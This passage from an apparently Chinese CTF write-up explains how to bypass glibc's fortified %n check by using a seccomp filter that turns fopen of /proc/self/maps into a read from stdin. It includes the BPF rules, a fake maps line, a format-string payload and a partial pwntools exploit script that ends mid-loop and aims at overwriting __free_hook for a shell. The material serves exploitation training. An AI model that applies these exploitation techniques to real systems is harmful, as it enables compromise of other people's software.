+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (! readonly_format)					      \</span><br><span class="line">    &#123;								      \</span><br><span class="line">      <span class="keyword">extern</span> <span class="keyword">int</span> __readonly_area (<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>)		      \</span><br><span class="line">	attribute_hidden;					      \</span><br><span class="line">      readonly_format						      \</span><br><span class="line">	= __readonly_area (format, ((STR_LEN (format) + <span class="number">1</span>)	      \</span><br><span class="line">				    * <span class="keyword">sizeof</span> (CHAR_T)));	      \</span><br><span class="line">    &#125;								      \</span><br><span class="line">  <span class="keyword">if</span> (readonly_format &lt; <span class="number">0</span>)					      \</span><br><span class="line">    __libc_fatal (<span class="string">"*** %n in writable segment detected ***\n"</span>);	      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到readonly<em>format是一个全局变量，当format不通过\</em>_readonly_area检测时，会返回一个负数，从而导致程序结束。</p>
+<p>再看一下__readonly_area(\glibc-2.23\sysdeps\unix\sysv\linux\readonly-area.c)，通过fopen打开”/proc/self/maps”，来判断ptr是否是只读段，这样我们好像只要让fprintf_chk认为format是只读段就可以了。</p>
+<p>由于我们没有其他权限，不能修改”/proc/self/maps”，可以看能否从fopen中做文章。</p>
+<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>提到fopen就不得不提到一个结构体__IO_FILE，这个结构体在IO利用方法里经常遇到，与通常open打开的文件不同的是，其为每个文件定义了缓冲区和虚表函数，而利用_fileno来判定是哪个文件，如stdin._fileno=0。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>而fopen中真正打开并填写fileno字段的函数在\libio\fileops.c中，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_file_open (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> posix_mode, <span class="keyword">int</span> prot,</span><br><span class="line">	       <span class="keyword">int</span> read_write, <span class="keyword">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">    fdesc = open_not_cancel (filename,</span><br><span class="line">			     posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于我们可以控制seccomp从而控制系统调用的访问，我们可以将此次打开返回ERROR ，而此时，open的返回值为0，此时fopen并不认为文件打开失败，而是认为其fileno是0，此时程序会从STDIN中读取数据，进行判断。</p>
+<p>既然可以控制程序读入的内容，我们可以输入一个伪造的maps数据，使其认为内存是不可写的，这样就可以绕过判断，构造如下数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/p4nda</span><br></pre></td></tr></table></figure>
+<p>这样我们可以绕过fprintf_chk判断，利用%n来写数据了。</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="沙箱构造"><a href="#沙箱构造" class="headerlink" title="沙箱构造"></a>沙箱构造</h3><p>我们可以构造这样一个沙箱规则，当遇到系统调用时open时，判断其参数的最后一个字节是否是libc中“/proc/self/maps”的地址，如果是就返回ERROR，否则继续。</p>
+<p>后续还有一个坑点，当fopen检查完后，会fclose关闭上述文件，此时用户stdin会被关闭，造成无法后续输入，这样简单，只需把close调用也关闭即可。</p>
+<p>最终沙箱规则如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : dead</span><br><span class="line">A = sys_number</span><br><span class="line">A == close ? dead : next</span><br><span class="line">A == exit_group ? dead : next</span><br><span class="line">A == open ? next : allow</span><br><span class="line">A = args[0]</span><br><span class="line">A &amp;= 0xff</span><br><span class="line">A == 0x7c ? dead : next</span><br><span class="line">allow:</span><br><span class="line"><span class="built_in">return</span> ALLOW</span><br><span class="line">dead:</span><br><span class="line"><span class="built_in">return</span> ERRNO(0)</span><br></pre></td></tr></table></figure>
+<p>利用seccomp-tools生成这样的规则：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; seccomp-tools <span class="keyword">asm</span> rule.<span class="keyword">asm</span> -a amd64 -f raw | seccomp-tools disasm -</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A != open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = args[<span class="number">0</span>]</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x54</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x000000ff</span>  A &amp;= <span class="number">0xff</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000007c</span>  <span class="keyword">if</span> (A == <span class="number">124</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00050000</span>  <span class="keyword">return</span> ERRNO(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>###格式化字符串</p>
+<p>已经知道了如何绕过%n的检测了，由于没有已知的地址，向哪里写数据又是一个问题，先看一下栈上有哪些数据吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint __fprintf_chk</span><br><span class="line">pwndbg&gt; x /40gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffd328:	0x0000555555554f4d	0x0000000000000000</span><br><span class="line">0x7fffffffd338:	0x0000007b00000000	0x00000000ff0a7025</span><br><span class="line">0x7fffffffd348:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffd358:	0x0000000000000000	0xff000000ff000000</span><br><span class="line">0x7fffffffd368:	0x0000ff0000000000	0x0000000000000000</span><br><span class="line">0x7fffffffd378:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffd388:	0x00007ffff7b09ef9	0x00007ffff7dd1b20</span><br><span class="line">0x7fffffffd398:	0x0000000000000080	0x0000000000000000</span><br><span class="line">0x7fffffffd3a8:	0x00007ffff7a948c9	0x0000000000000000</span><br><span class="line">0x7fffffffd3b8:	0x00007ffff7a8e86b	0x0000000000000000</span><br><span class="line">0x7fffffffd3c8:	0x00000000000000a0	0x0000000000000fff</span><br><span class="line">0x7fffffffd3d8:	0xfffffffffffff000	0x0000555555757000</span><br><span class="line">0x7fffffffd3e8:	0x0000000000001000	0x00000000f7dd7390</span><br><span class="line">0x7fffffffd3f8:	0x0000000000000000	0x00007fffffffd530</span><br><span class="line">0x7fffffffd408:	0x00007ffff7ffea88	0x00007fffffffd560</span><br><span class="line">0x7fffffffd418:	0x00007fffffffd5c0	0x00000000ffffffff</span><br><span class="line">0x7fffffffd428:	0x00007ffff7dd1b20	0x0000000000000080</span><br><span class="line">0x7fffffffd438:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x7fffffffd448:	0x0000000000002710	0x0000000000000000</span><br><span class="line">0x7fffffffd458:	0x000000000000000a	0x00007fffffffd57c</span><br><span class="line">pwndbg&gt; x /s 0x0000555555757010</span><br><span class="line">0x555555757010:	<span class="string">"DwHxGpmDtDevggh"</span>...</span><br></pre></td></tr></table></figure>
+<p>可以看到，在0x7fffffffd3e0这里，有一个离secret很近的地址，可以通过低字节修改使其指向secret，这样由于判定条件时，不相等的位置是否等于strlen(secret)，这样只要我们向secret写\0，就可以很容易绕过check了，构造格式化字符串如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fmt = (<span class="string">"%256p"</span>*<span class="number">0x19</span>+<span class="string">'%n'</span>).ljust(<span class="number">0xa0</span>,<span class="string">'a'</span>)</span><br><span class="line">input(<span class="number">0x120</span>,fmt+<span class="string">'\x10'</span>)<span class="comment">#7</span></span><br></pre></td></tr></table></figure>
+<p>此时可以拿到vmmap内容，后续可以再次通过格式化字符串修改__free_hook为system就可以拿到shell，就是这样的格式化字符串构造有点烦…</p>
+<p>堆漏洞也可以利用，不过由于有访问此时的限制，我总是差一次访问，就没有细究这种方法是否可行。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./secret_center'</span>)</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./secret_center'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="comment">#p = remote('106.75.73.20', 8999)#process('./pwn1')</span></span><br><span class="line">	p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10006</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span></span><br><span class="line"><span class="string"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span></span><br><span class="line"><span class="string"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span></span><br><span class="line"><span class="string"> 0003: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0010</span></span><br><span class="line"><span class="string"> 0004: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0010</span></span><br><span class="line"><span class="string"> 0005: 0x15 0x00 0x03 0x00000002  if (A != open) goto 0009</span></span><br><span class="line"><span class="string"> 0006: 0x20 0x00 0x00 0x00000010  A = args[0]</span></span><br><span class="line"><span class="string"> 0007: 0x54 0x00 0x00 0x000000ff  A &amp;= 0xff</span></span><br><span class="line"><span class="string"> 0008: 0x15 0x01 0x00 0x0000007c  if (A == 124) goto 0010</span></span><br><span class="line"><span class="string"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span></span><br><span class="line"><span class="string"> 0010: 0x06 0x00 0x00 0x00050001  return ERRNO(1)</span></span><br><span class="line"><span class="string"> 0011: 0x06 0x00 0x00 0x00050001  return ERRNO(1)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> debug:</span><br><span class="line">		gdb.attach(p,a)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guard_ready</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_guard</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'6'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">	p.send(content)	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Secret Size: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">	<span class="comment">#sleep(0.1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rule</span><span class="params">(code,jt ,jf ,k)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> p16(code) + p8(jt) + p8(jf) + p32(k) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rule</span><span class="params">()</span>:</span></span><br><span class="line">	payload = <span class="string">''</span></span><br><span class="line">	payload+= rule(<span class="number">0x20</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000004</span>) <span class="comment">#  A = arch</span></span><br><span class="line">	payload+= rule(<span class="number">0x15</span> ,<span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0xc000003e</span>) <span class="comment">#  if (A != ARCH_X86_64) goto 0010</span></span><br><span class="line">	payload+= rule(<span class="number">0x20</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>) <span class="comment">#  A = sys_number</span></span><br><span class="line">	payload+= rule(<span class="number">0x15</span> ,<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00000003</span>) <span class="comment">#  if (A == close) goto 0010</span></span><br><span class="line">	payload+= rule(<span class="number">0x15</span> ,<span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x000000e7</span>) <span class="comment">#  if (A == exit_group) goto 0010</span></span><br><span class="line">	payload+= rule(<span class="number">0x15</span> ,<span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00000002</span>) <span class="comment">#  if (A != open) goto 0009</span></span><br><span class="line">	payload+= rule(<span class="number">0x20</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000010</span>) <span class="comment">#  A = args[0]</span></span><br><span class="line">	payload+= rule(<span class="number">0x54</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x000000ff</span>) <span class="comment">#  A &amp;= 0xff</span></span><br><span class="line">	payload+= rule(<span class="number">0x15</span> ,<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0000007c</span>) <span class="comment">#  if (A == 124) goto 0010</span></span><br><span class="line">	payload+= rule(<span class="number">0x06</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7fff0000</span>) <span class="comment">#  return ALLOW</span></span><br><span class="line">	payload+= rule(<span class="number">0x06</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00050000</span>) <span class="comment">#  return ERRNO(2)</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">input(<span class="number">0xF0</span> ,<span class="string">'p4nda'</span>) <span class="comment">#1</span></span><br><span class="line">delete()<span class="comment">#2</span></span><br><span class="line">guard_ready()<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">rule_data = build_rule()<span class="comment">#4</span></span><br><span class="line">edit(len(rule_data),rule_data)<span class="comment">#5</span></span><br><span class="line">set_guard()<span class="comment">#6</span></span><br><span class="line"><span class="comment">#z('b fopen\nb __fprintf_chk\nc')</span></span><br><span class="line"></span><br><span class="line">fmt = (<span class="string">"%256p"</span>*<span class="number">0x19</span>+<span class="string">'%n'</span>).ljust(<span class="number">0xa0</span>,<span class="string">'a'</span>)</span><br><span class="line">input(<span class="number">0x120</span>,fmt+<span class="string">'\x10'</span>)<span class="comment">#7</span></span><br><span class="line">p.recvuntil(<span class="string">"Not Good Secret :P\n\n"</span>)</span><br><span class="line">maps = <span class="string">'000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/p4nda'</span></span><br><span class="line">p.sendline(maps)</span><br><span class="line">input(<span class="number">0x68</span>,<span class="string">'\x00'</span>)<span class="comment">#8</span></span><br><span class="line">libc_address = <span class="number">0</span></span><br><span class="line">heap_address = <span class="number">0</span></span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	tmp = p.readline()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"close"</span> <span class="keyword">in</span> tmp:</span><br><span class="line">		tmp+= p.readline()</span><br><span class="line">		tmp.replace(<span class="string">"It's close.. Try to get a shell!\n"</span>,<span class="string">''</span>)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[?]'</span>,tmp<span class="comment">#.split('-')[0]</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="string">'libc-2.23.so'</span> <span class="keyword">in</span> tmp):</span><br><span class="line">		addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">		<span class="keyword">if</span> libc_address == <span class="number">0</span>:</span><br><span class="line">			libc_address = addr</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'heap'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">		addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">		<span class="keyword">if</span> heap_address == <span class="number">0</span>:</span><br><span class="line">			heap_address = addr</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'secret_center'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">		addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">		<span class="keyword">if</span> pie == <span class="number">0</span>:</span><br><span class="line">			pie = addr</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (libc_address*heap_address*pie != <span class="number">0</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br><span 